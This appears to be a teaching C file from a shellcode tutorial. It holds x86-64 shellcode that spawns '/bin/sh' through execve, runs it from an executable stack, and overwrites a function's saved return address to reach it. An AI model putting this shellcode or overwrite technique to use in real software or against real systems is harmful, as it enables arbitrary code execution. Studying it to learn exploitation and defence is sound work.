/*
Now, putting it all together:

We have taken the byte code that we got from the disassembly of shellcode_asm.c,
and stuck it in a char array allocated on the stack.

We have added the string "/bin/sh" immediately after the call instruction,
we have also padded the array with trailing zeroes, which is the area in which
we will end up storing the arguments to execve.

Normally data in the stack is non-executable, we bypass this by compiling with
the `-z execstack` option.
*/

void foo(void) {
    int i;
    char buf[69] =
        "\xeb\x21\x41\x58\x4d\x89\x40\x08\x31\xc0\x41\x89\x40\x10\x89\xc2\xb0"
        "\x3b\x49\x8d\x70\x08\x49\x8b\x78\x08\x0f\x05\x48\x31\xff\xb0\x3c\x0f"
        "\x05\xe8\xda\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";
    long *ret = (long *)((char *)&i + 20);
    *ret = (long)buf;
}

int main(void) {
    foo();
    return 0;
}
